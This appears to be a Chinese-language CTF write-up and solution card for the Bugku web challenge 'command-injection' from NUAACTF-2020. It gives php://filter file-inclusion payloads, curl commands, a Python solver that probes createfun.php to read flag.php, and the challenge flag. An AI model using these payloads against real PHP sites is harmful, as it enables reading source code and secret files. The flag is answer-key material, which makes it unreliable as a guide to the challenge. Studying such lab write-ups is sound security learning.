# 第36题：command-injection

## 基本信息
- 平台：Bugku CTF
- 题库URL：https://ctf.bugku.com/challenges/index/gid/2/tid/1/status/-1.html
- 全局题号：第36题
- 题目名称：command-injection
- 题目类型：WEB
- 所属赛事：NUAACTF-2020
- 题目链接：https://ctf.bugku.com/challenges/detail/id/546.html
- 是否有附件：否
- 附件类型：无

## 题面
题目描述只给出 flag 格式：`nuaactf{}`。

## 分析过程
该题名为 command-injection，但公开评论显示实际考点同时包含文件包含、目录扫描和代码审计。可从页面注释或目录猜测发现 `include.php`，再利用 `include.php?file=...` 读取源码，定位到 `createfun.php` 具备通过参数调用 PHP 函数的逻辑。随后使用 `readfile`、`highlight_file` 或 `show_source` 等读取 `flag.php`。

## 解题步骤
1. 打开题目场景，检查 HTML 注释和隐藏路径。
2. 访问 `/include.php?file=index` 或类似路径验证文件包含。
3. 通过 `php://filter/convert.base64-encode/resource=createfun` 读取 `createfun.php` 源码。
4. 根据源码中函数调用逻辑，构造读取 flag 的 URL。
5. 访问 `/createfun.php?func=readfile&arg=flag.php` 或 `/createfun.php?func=highlight_file&arg=flag.php`。
6. 从返回内容中提取 flag。

## 使用工具和命令
```bash
curl -s "$URL/include.php?file=php://filter/convert.base64-encode/resource=createfun" | base64 -d
curl -s "$URL/createfun.php?func=readfile&arg=flag.php"
curl -s "$URL/createfun.php?func=highlight_file&arg=flag.php"
```

## 结果
flag：`nuaactf{php_IS_thE_best_language}`

## 可复用性判断
- 是否可复用：可复用
- 可复用技法：文件包含读取源码 + 参数化 PHP 函数调用读取 flag
- 是否需要写 solver：是
- 是否产生 artifact：否

## blocked 情况
- blocked：否

## JSON 解法转化卡
```json
{
  "title": "文件包含读取源码后调用PHP文件读取函数",
  "source_id": "[Bugku] 第36题 command-injection",
  "capability_id": "",
  "category": "web",
  "attachment_type": "无",
  "detection": {
    "keywords": ["command injection", "LFI", "include.php", "createfun", "readfile", "highlight_file", "命令注入", "文件包含", "源码读取"],
    "attachment_features": "无附件，Web 场景中存在 include.php 或可控 file 参数，后续存在 func/arg 形式的函数调用入口",
    "condition": "当题目存在 include.php?file= 读取源码入口，并发现 func/arg 可控函数调用时适用"
  },
  "method": {
    "principle": "先利用文件包含读取源码，再利用可控 PHP 函数调用读取 flag 文件。",
    "steps": [
      "检查 HTML 注释、robots、目录扫描结果，寻找 include.php、createfun.php 等入口",
      "用 php://filter/convert.base64-encode/resource=目标文件 读取 PHP 源码",
      "审计源码中是否存在 func/arg 等可控函数调用",
      "优先尝试 readfile、highlight_file、show_source 读取 flag.php",
      "从返回内容中提取 flag"
    ],
    "tools": ["curl", "base64", "python3"],
    "produces_artifact": false
  },
  "solver": {
    "reusable": true,
    "module_name": "php_lfi_func_reader",
    "code": "import re, sys, urllib.parse, urllib.request\n\nPAT = re.compile(r'(?:flag|ctf|nuaactf)\\{[^}]{1,200}\\}', re.I)\n\ndef fetch(url):\n    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})\n    with urllib.request.urlopen(req, timeout=15) as r:\n        return r.read().decode('utf-8', 'ignore')\n\ndef join(base, path):\n    return base.rstrip('/') + '/' + path.lstrip('/')\n\ndef main():\n    if len(sys.argv) < 2:\n        print('Usage: python3 php_lfi_func_reader.py <base_url>')\n        sys.exit(1)\n    base = sys.argv[1].rstrip('/')\n    candidates = [\n        '/createfun.php?func=readfile&arg=flag.php',\n        '/createfun.php?func=highlight_file&arg=flag.php',\n        '/createfun.php?func=show_source&arg=flag.php',\n        '/include.php?file=flag.php',\n    ]\n    for p in candidates:\n        url = join(base, p)\n        try:\n            body = fetch(url)\n        except Exception as e:\n            print(f'[-] {url} -> {e}')\n            continue\n        hits = PAT.findall(body)\n        print(f'[+] tried {url}, hits={hits}')\n        for h in hits:\n            print(h)\n\nif __name__ == '__main__':\n    main()\n",
    "input": "题目场景根 URL",
    "output": "尝试多个源码读取/函数调用入口并输出 flag 候选"
  },
  "verification": {
    "flag": "nuaactf{php_IS_thE_best_language}",
    "how": "python3 php_lfi_func_reader.py <challenge_base_url>"
  }
}
```
